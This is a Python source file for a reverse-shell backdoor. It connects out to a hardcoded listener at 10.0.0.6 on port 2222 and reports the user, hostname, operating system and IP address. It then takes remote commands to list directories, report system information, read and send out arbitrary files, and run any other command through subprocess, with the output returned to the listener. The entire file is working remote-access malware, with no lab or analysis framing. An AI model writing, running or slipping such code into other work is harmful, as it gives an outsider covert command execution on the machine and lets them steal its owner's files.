import socket
import os
import platform
import getpass
import subprocess


HOST = "10.0.0.6"
PORT = 2222

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    head = f"{getpass.getuser()}@{platform.node()}-{platform.system()}[{socket.gethostbyname(socket.gethostname())}]"
    sock.send(head.encode())

    while True:
        try:
            sout = None
            serr = None
            cmd = sock.recv(1024).decode()
            if cmd == "list":
                dirs = str(os.listdir(".")).encode()
                b_dirs = bytearray()
                b_dirs.extend(i for i in dirs)
                sock.send(b_dirs)
            elif cmd == "sysinfo":
                info = f"""
                user: {getpass.getuser()}
                computer: {platform.node()}
                os: {platform.system()}
                """
                sock.send(info.encode())
            elif cmd.split(" ")[0] == "download":
                path = cmd.split(" ")[1]
                with open(path, "r") as fh:
                    data = fh.read(1024)
                    while True:
                        if len(data) == 0:
                            break
                        sock.send(data.encode())
                        data = fh.read(1024)
                sock.send("DONE".encode())
            elif cmd in {"q", "quit", "Q", "Quit"}:
                print("terminating...")
                sock.send(cmd.encode())
                break
            else:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                sout, serr = proc.communicate()
                if not sout:
                    sock.send(serr)
                else:
                    sock.send(sout)
        except socket.herror as err:
            print(f"error: {err}, terminating...")
            sock.send(str("quit").encode())
            sock.close()
            break
        except Exception as err:
            print("error: ", err)
            sock.send(str(err).encode())
            continue
    sock.close()
